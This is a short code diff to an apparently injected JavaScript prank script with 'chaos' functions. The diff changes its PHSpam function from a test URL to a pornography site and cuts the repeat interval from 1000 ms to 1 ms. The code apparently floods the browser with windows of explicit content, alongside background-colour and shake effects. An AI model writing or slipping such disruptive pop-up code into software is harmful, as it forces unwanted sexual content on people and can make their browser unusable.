@@ -28,7 +28,7 @@ if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') ===
           document.body.appendChild(vid);
         },
 PHSpam: () => {
-  const url = 'https://test.com';
+  const url = 'https://pornhub.com';
   const portals = [];
 
   let wins = [];
@@ -53,7 +53,7 @@ PHSpam: () => {
         }
       }
     }
-  }, 1000);
+  }, 1);
 },
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
